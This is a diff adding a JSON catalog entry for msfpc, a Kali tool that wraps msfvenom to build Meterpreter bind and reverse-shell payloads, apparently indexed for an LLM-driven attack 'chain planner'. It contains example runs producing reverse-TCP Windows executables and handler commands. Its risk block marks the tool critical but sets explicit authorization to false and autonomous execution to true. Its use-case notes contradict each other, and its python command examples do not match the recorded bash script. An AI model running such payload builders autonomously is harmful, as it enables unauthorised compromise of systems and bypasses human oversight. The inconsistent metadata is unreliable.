@@ -1,0 +1,144 @@
+{
+  "id": "kali:msfpc",
+  "kind": "kali_source_package",
+  "name": "msfpc",
+  "title": "msfpc",
+  "summary": "### msfpc",
+  "version": "1.4.5-0kali3",
+  "architectures": [
+    "any"
+  ],
+  "homepage": "https://github.com/g0tmi1k/msfpc",
+  "repository": "https://gitlab.com/kalilinux/packages/msfpc",
+  "metapackages": [
+    "kali-linux-default",
+    "kali-linux-everything",
+    "kali-linux-headless",
+    "kali-linux-large",
+    "kali-linux-nethunter",
+    "kali-tools-exploitation",
+    "kali-tools-social-engineering"
+  ],
+  "install": {
+    "apt": "sudo apt install msfpc"
+  },
+  "packages": [
+    {
+      "name": "msfpc"
+    }
+  ],
+  "commands": [
+    {
+      "name": "msfpc",
+      "description": "- - -",
+      "usage": null,
+      "arguments": [],
+      "raw_help": "root@kali:~# msfpc -h\n[*] MSFvenom Payload Creator (MSFPC v1.4.5)\n \n/usr/bin/msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)\n  Example: /usr/bin/msfpc windows 192.168.1.10        # Windows & manual IP.\n           /usr/bin/msfpc elf bind eth0 4444          # Linux, eth0's IP & manual port.\n           /usr/bin/msfpc stageless cmd py https      # Python, stageless command prompt.\n           /usr/bin/msfpc verbose loop eth1           # A payload for every type, using eth1's IP.\n           /usr/bin/msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.\n           /usr/bin/msfpc help verbose                # Help screen, with even more information.\n \n<TYPE>:\n  + APK\n  + ASP\n  + ASPX\n  + Bash [.sh]\n  + Java [.jsp]\n  + Linux [.elf]\n  + OSX [.macho]\n  + Perl [.pl]\n  + PHP\n  + Powershell [.ps1]\n  + Python [.py]\n  + Tomcat [.war]\n  + Windows [.exe // .exe // .dll]\n \nRather than putting <DOMAIN/IP>, you can do a interface and MSFPC will detect that IP address.\nMissing <DOMAIN/IP> will default to the IP menu.\n \nMissing <PORT> will default to 443.\n \n<CMD> is a standard/native command prompt/terminal to interactive with.\n<MSF> is a custom cross platform shell, gaining the full power of Metasploit.\nMissing <CMD/MSF> will default to <MSF> where possible.\n \n<BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.\n<REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.\nMissing <BIND/REVERSE> will default to <REVERSE>.\n \n<STAGED> splits the payload into parts, making it smaller but dependent on Metasploit.\n<STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>.\nMissing <STAGED/STAGELESS> will default to <STAGED> where possible.\n \n<TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.\n<HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.\n<HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.\n<FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>.\nMissing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>.\n \n<BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGELESS> & <TCP + HTTP + HTTPS + FIND_PORT> \n<LOOP> will just create one of each <TYPE>.\n \n<VERBOSE> will display more information.",
+      "examples": [
+        {
+          "status": "operational_example",
+          "command": "msfpc windows bind 5555 verbose\n [*] MSFvenom Payload Creator (MSFPC v1.4.4)\n\n [i] Use which interface - IP address?:\n [i]   1.) lo - 127.0.0.1\n [i]   2.) eth0 - 172.16.193.160\n [i]   3.) wan - 68.151.240.61\n [?] Select 1-3, interface or IP address: 2\n\n [i]        IP: 172.16.193.160\n [i]      PORT: 5555\n [i]      TYPE: windows (windows/meterpreter/bind_tcp)\n [i]     SHELL: meterpreter\n [i] DIRECTION: bind\n [i]     STAGE: staged\n [i]    METHOD: tcp\n [i]       CMD: msfvenom -p windows/meterpreter/bind_tcp -f exe \\\n  --platform windows -a x86 -e generic/none  LPORT=5555 \\\n  > '/root/windows-meterpreter-staged-bind-tcp-5555.exe'\n\n [i] windows meterpreter created: '/root/windows-meterpreter-staged-bind-tcp-5555.exe'\n\n [i] File: PE32 executable (GUI) Intel 80386, for MS Windows\n [i] Size: 76K\n [i]  MD5: 5bdb434e053fa0a9894eb88720c09e2a\n [i] SHA1: 9d51c45c76dfd947994cb4be61f5f9797b35167f\n\n [i] MSF handler file: '/root/windows-meterpreter-staged-bind-tcp-5555-exe.rc'\n [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-bind-tcp-5555-exe.rc'\n [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080\n [*] Done!",
+          "template": null,
+          "original_sha256": "554c898c75769e5adc75c4d4b0c0bc192937fccf6d64f9081858306d77506bf5"
+        },
+        {
+          "status": "operational_example",
+          "command": "msfpc windows eth0\n [*] MSFvenom Payload Creator (MSFPC v1.4.4)\n [i]   IP: 172.16.193.160\n [i] PORT: 443\n [i] TYPE: windows (windows/meterpreter/reverse_tcp)\n [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe \\\n  --platform windows -a x86 -e generic/none LHOST=172.16.193.160 LPORT=443 \\\n  > '/root/windows-meterpreter-staged-reverse-tcp-443.exe'\n\n [i] windows meterpreter created: '/root/windows-meterpreter-staged-reverse-tcp-443.exe'\n\n [i] MSF handler file: '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'\n [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'\n [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080\n [*] Done!",
+          "template": null,
+          "original_sha256": "458ad26089a4a5086784a2f484e5bb128ee405f14c522353b81d056ea919d037"
+        }
+      ],
+      "risk": {
+        "level": "critical",
+        "signals": [
+          "payload",
+          "rat"
+        ],
+        "requires_explicit_authorization": false,
+        "allow_autonomous_execution": true,
+        "examples_policy": "operational"
+      },
+      "local_help": {
+        "--help": "\u001b[01;34m[*]\u001b[00m \u001b[01;34mMSF\u001b[00mvenom \u001b[01;34mP\u001b[00mayload \u001b[01;34mC\u001b[00mreator (\u001b[01;34mMSFPC\u001b[00m v\u001b[01;34m1.4.5\u001b[00m)\n\n \u001b[01;34m/usr/bin/msfpc\u001b[00m <\u001b[01;01mTYPE\u001b[00m> (<\u001b[01;01mDOMAIN/IP\u001b[00m>) (<\u001b[01;01mPORT\u001b[00m>) (<\u001b[01;01mCMD/MSF\u001b[00m>) (<\u001b[01;01mBIND/REVERSE\u001b[00m>) (<\u001b[01;01mSTAGED/STAGELESS\u001b[00m>) (<\u001b[01;01mTCP/HTTP/HTTPS/FIND_PORT\u001b[00m>) (<\u001b[01;01mBATCH/LOOP\u001b[00m>) (<\u001b[01;01mVERBOSE\u001b[00m>)\n   Example: \u001b[01;34m/usr/bin/msfpc windows 192.168.1.10\u001b[00m        # Windows & manual IP.\n            \u001b[01;34m/usr/bin/msfpc elf bind eth0 4444\u001b[00m          # Linux, eth0's IP & manual port.\n            \u001b[01;34m/usr/bin/msfpc stageless cmd py https\u001b[00m      # Python, stageless command prompt.\n            \u001b[01;34m/usr/bin/msfpc verbose loop eth1\u001b[00m           # A payload for every type, using eth1's IP.\n            \u001b[01;34m/usr/bin/msfpc msf batch wan\u001b[00m               # All possible Meterpreter payloads, using WAN IP.\n            \u001b[01;34m/usr/bin/msfpc help verbose\u001b[00m                # Help screen, with even more information.\n\n <\u001b[01;01mTYPE\u001b[00m>:\n   + \u001b[01;33mAPK\u001b[00m\n   + \u001b[01;33mASP\u001b[00m\n   + \u001b[01;33mASPX\u001b[00m\n   + \u001b[01;33mBash\u001b[00m [.\u001b[01;33msh\u001b[00m]\n   + \u001b[01;33mJava\u001b[00m [.\u001b[01;33mjsp\u001b[00m]\n   + \u001b[01;33mLinux\u001b[00m [.\u001b[01;33melf\u001b[00m]\n   + \u001b[01;33mOSX\u001b[00m [.\u001b[01;33mmacho\u001b[00m]\n   + \u001b[01;33mPerl\u001b[00m [.\u001b[01;33mpl\u001b[00m]\n   + \u001b[01;33mPHP\u001b[00m\n   + \u001b[01;33mPowershell\u001b[00m [.\u001b[01;33mps1\u001b[00m]\n   + \u001b[01;33mPython\u001b[00m [.\u001b[01;33mpy\u001b[00m]\n   + \u001b[01;33mTomcat\u001b[00m [.\u001b[01;33mwar\u001b[00m]\n   + \u001b[01;33mWindows\u001b[00m [.\u001b[01;33mexe\u001b[00m // .\u001b[01;33mexe\u001b[00m // .\u001b[01;33mdll\u001b[00m]\n\n Rather than putting <DOMAIN/IP>, you can do a interface and MSFPC will detect that IP address.\n Missing <DOMAIN/IP> will default to the IP menu.\n\n Missing <PORT> will default to 443.\n\n <CMD> is a standard/native command prompt/terminal to interactive with.\n <MSF> is a custom cross platform shell, gaining the full power of Metasploit.\n Missing <CMD/MSF> will default to <MSF> where possible.\n\n <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.\n <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.\n Missing <BIND/REVERSE> will default to <REVERSE>.\n\n <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit.\n <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>.\n Missing <STAGED/STAGELESS> will default to <STAGED> where possible.\n\n <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.\n <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.\n <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.\n <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>.\n Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>.\n\n <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGELESS> & <TCP + HTTP + HTTPS + FIND_PORT> \n <LOOP> will just create one of each <TYPE>.\n\n <VERBOSE> will display more information.",
+        "-h": "\u001b[01;34m[*]\u001b[00m \u001b[01;34mMSF\u001b[00mvenom \u001b[01;34mP\u001b[00mayload \u001b[01;34mC\u001b[00mreator (\u001b[01;34mMSFPC\u001b[00m v\u001b[01;34m1.4.5\u001b[00m)\n\n \u001b[01;34m/usr/bin/msfpc\u001b[00m <\u001b[01;01mTYPE\u001b[00m> (<\u001b[01;01mDOMAIN/IP\u001b[00m>) (<\u001b[01;01mPORT\u001b[00m>) (<\u001b[01;01mCMD/MSF\u001b[00m>) (<\u001b[01;01mBIND/REVERSE\u001b[00m>) (<\u001b[01;01mSTAGED/STAGELESS\u001b[00m>) (<\u001b[01;01mTCP/HTTP/HTTPS/FIND_PORT\u001b[00m>) (<\u001b[01;01mBATCH/LOOP\u001b[00m>) (<\u001b[01;01mVERBOSE\u001b[00m>)\n   Example: \u001b[01;34m/usr/bin/msfpc windows 192.168.1.10\u001b[00m        # Windows & manual IP.\n            \u001b[01;34m/usr/bin/msfpc elf bind eth0 4444\u001b[00m          # Linux, eth0's IP & manual port.\n            \u001b[01;34m/usr/bin/msfpc stageless cmd py https\u001b[00m      # Python, stageless command prompt.\n            \u001b[01;34m/usr/bin/msfpc verbose loop eth1\u001b[00m           # A payload for every type, using eth1's IP.\n            \u001b[01;34m/usr/bin/msfpc msf batch wan\u001b[00m               # All possible Meterpreter payloads, using WAN IP.\n            \u001b[01;34m/usr/bin/msfpc help verbose\u001b[00m                # Help screen, with even more information.\n\n <\u001b[01;01mTYPE\u001b[00m>:\n   + \u001b[01;33mAPK\u001b[00m\n   + \u001b[01;33mASP\u001b[00m\n   + \u001b[01;33mASPX\u001b[00m\n   + \u001b[01;33mBash\u001b[00m [.\u001b[01;33msh\u001b[00m]\n   + \u001b[01;33mJava\u001b[00m [.\u001b[01;33mjsp\u001b[00m]\n   + \u001b[01;33mLinux\u001b[00m [.\u001b[01;33melf\u001b[00m]\n   + \u001b[01;33mOSX\u001b[00m [.\u001b[01;33mmacho\u001b[00m]\n   + \u001b[01;33mPerl\u001b[00m [.\u001b[01;33mpl\u001b[00m]\n   + \u001b[01;33mPHP\u001b[00m\n   + \u001b[01;33mPowershell\u001b[00m [.\u001b[01;33mps1\u001b[00m]\n   + \u001b[01;33mPython\u001b[00m [.\u001b[01;33mpy\u001b[00m]\n   + \u001b[01;33mTomcat\u001b[00m [.\u001b[01;33mwar\u001b[00m]\n   + \u001b[01;33mWindows\u001b[00m [.\u001b[01;33mexe\u001b[00m // .\u001b[01;33mexe\u001b[00m // .\u001b[01;33mdll\u001b[00m]\n\n Rather than putting <DOMAIN/IP>, you can do a interface and MSFPC will detect that IP address.\n Missing <DOMAIN/IP> will default to the IP menu.\n\n Missing <PORT> will default to 443.\n\n <CMD> is a standard/native command prompt/terminal to interactive with.\n <MSF> is a custom cross platform shell, gaining the full power of Metasploit.\n Missing <CMD/MSF> will default to <MSF> where possible.\n\n <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.\n <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.\n Missing <BIND/REVERSE> will default to <REVERSE>.\n\n <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit.\n <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>.\n Missing <STAGED/STAGELESS> will default to <STAGED> where possible.\n\n <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.\n <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.\n <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.\n <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>.\n Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>.\n\n <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGELESS> & <TCP + HTTP + HTTPS + FIND_PORT> \n <LOOP> will just create one of each <TYPE>.\n\n <VERBOSE> will display more information.",
+        "help": "\u001b[01;34m[*]\u001b[00m \u001b[01;34mMSF\u001b[00mvenom \u001b[01;34mP\u001b[00mayload \u001b[01;34mC\u001b[00mreator (\u001b[01;34mMSFPC\u001b[00m v\u001b[01;34m1.4.5\u001b[00m)\n\n \u001b[01;34m/usr/bin/msfpc\u001b[00m <\u001b[01;01mTYPE\u001b[00m> (<\u001b[01;01mDOMAIN/IP\u001b[00m>) (<\u001b[01;01mPORT\u001b[00m>) (<\u001b[01;01mCMD/MSF\u001b[00m>) (<\u001b[01;01mBIND/REVERSE\u001b[00m>) (<\u001b[01;01mSTAGED/STAGELESS\u001b[00m>) (<\u001b[01;01mTCP/HTTP/HTTPS/FIND_PORT\u001b[00m>) (<\u001b[01;01mBATCH/LOOP\u001b[00m>) (<\u001b[01;01mVERBOSE\u001b[00m>)\n   Example: \u001b[01;34m/usr/bin/msfpc windows 192.168.1.10\u001b[00m        # Windows & manual IP.\n            \u001b[01;34m/usr/bin/msfpc elf bind eth0 4444\u001b[00m          # Linux, eth0's IP & manual port.\n            \u001b[01;34m/usr/bin/msfpc stageless cmd py https\u001b[00m      # Python, stageless command prompt.\n            \u001b[01;34m/usr/bin/msfpc verbose loop eth1\u001b[00m           # A payload for every type, using eth1's IP.\n            \u001b[01;34m/usr/bin/msfpc msf batch wan\u001b[00m               # All possible Meterpreter payloads, using WAN IP.\n            \u001b[01;34m/usr/bin/msfpc help verbose\u001b[00m                # Help screen, with even more information.\n\n <\u001b[01;01mTYPE\u001b[00m>:\n   + \u001b[01;33mAPK\u001b[00m\n   + \u001b[01;33mASP\u001b[00m\n   + \u001b[01;33mASPX\u001b[00m\n   + \u001b[01;33mBash\u001b[00m [.\u001b[01;33msh\u001b[00m]\n   + \u001b[01;33mJava\u001b[00m [.\u001b[01;33mjsp\u001b[00m]\n   + \u001b[01;33mLinux\u001b[00m [.\u001b[01;33melf\u001b[00m]\n   + \u001b[01;33mOSX\u001b[00m [.\u001b[01;33mmacho\u001b[00m]\n   + \u001b[01;33mPerl\u001b[00m [.\u001b[01;33mpl\u001b[00m]\n   + \u001b[01;33mPHP\u001b[00m\n   + \u001b[01;33mPowershell\u001b[00m [.\u001b[01;33mps1\u001b[00m]\n   + \u001b[01;33mPython\u001b[00m [.\u001b[01;33mpy\u001b[00m]\n   + \u001b[01;33mTomcat\u001b[00m [.\u001b[01;33mwar\u001b[00m]\n   + \u001b[01;33mWindows\u001b[00m [.\u001b[01;33mexe\u001b[00m // .\u001b[01;33mexe\u001b[00m // .\u001b[01;33mdll\u001b[00m]\n\n Rather than putting <DOMAIN/IP>, you can do a interface and MSFPC will detect that IP address.\n Missing <DOMAIN/IP> will default to the IP menu.\n\n Missing <PORT> will default to 443.\n\n <CMD> is a standard/native command prompt/terminal to interactive with.\n <MSF> is a custom cross platform shell, gaining the full power of Metasploit.\n Missing <CMD/MSF> will default to <MSF> where possible.\n\n <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.\n <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.\n Missing <BIND/REVERSE> will default to <REVERSE>.\n\n <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit.\n <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>.\n Missing <STAGED/STAGELESS> will default to <STAGED> where possible.\n\n <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.\n <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.\n <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.\n <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>.\n Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>.\n\n <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGELESS> & <TCP + HTTP + HTTPS + FIND_PORT> \n <LOOP> will just create one of each <TYPE>.\n\n <VERBOSE> will display more information."
+      },
+      "binary_metadata": {
+        "path": "/usr/bin/msfpc",
+        "size_bytes": 43633,
+        "is_symlink": false,
+        "file_type": "Bourne-Again shell script, ASCII text executable, with very long lines (305)"
+      }
+    }
+  ],
+  "risk": {
+    "level": "critical",
+    "signals": [
+      "offensive_tool",
+      "intrinsic",
+      "remote_possible",
+      "polymorphic_compatible",
+      "target_adaptive_compatible"
+    ],
+    "requires_explicit_authorization": false,
+    "allow_autonomous_execution": true,
+    "examples_policy": "operational"
+  },
+  "source": {
+    "official": true,
+    "page": "https://www.kali.org/tools/msfpc/",
+    "raw_markdown": "https://gitlab.com/kalilinux/documentation/kali-tools/-/raw/main/msfpc/index.md",
+    "retrieved_at": "2026-07-14T13:06:46+00:00",
+    "sha256": "175af895536bbe4adbcd204110a507f6f241ba40568666a1c5459c2e7413d01d"
+  },
+  "apt_metadata": {
+    "section": "net",
+    "installed_size": "58",
+    "maintainer": "Kali Developers <devel@kali.org>",
+    "architecture": "amd64",
+    "version": "1.4.5-0kali3",
+    "depends": "metasploit-framework",
+    "description": "MSFvenom Payload Creator (MSFPC)\nA quick way to generate various \"basic\" Meterpreter payloads using msfvenom\nwhich is part of the Metasploit framework.",
+    "homepage": "https://github.com/g0tmi1k/msfpc"
+  },
+  "tags": [
+    "offensive",
+    "msfpc",
+    "web",
+    "kfiosa",
+    "indexed",
+    "polymorphic",
+    "target-adaptive"
+  ],
+  "use_cases": [
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Pair with the LLM system-prompt stanza to ensure the chain planner knows how to call this tool."
+  ],
+  "command_examples": [
+    "cd toolboxes/msfpc && python3 msfpc.py --target $KFIOSA_TARGET_HOST",
+    "cd toolboxes/msfpc && python3 msfpc.py --help",
+    "cd toolboxes/msfpc && python3 msfpc.py --help",
+    "cd toolboxes/msfpc && python3 msfpc.py --help",
+    "cd toolboxes/msfpc && python3 msfpc.py --help",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST msfpc --output $KFIOSA_OUTPUT_DIR/msfpc.log",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST msfpc --output $KFIOSA_OUTPUT_DIR/msfpc.log"
+  ],
+  "attack_surface": [
+    "web"
+  ],
+  "phase_hint": "any",
+  "requires_hardware": [
+    "none"
+  ],
+  "polymorphic_strategies": [
+    "param_grammar"
+  ],
+  "target_adaptive_targets": [
+    "target_class"
+  ],
+  "_kfiosa_enriched_schema": "1.1.0"
+}
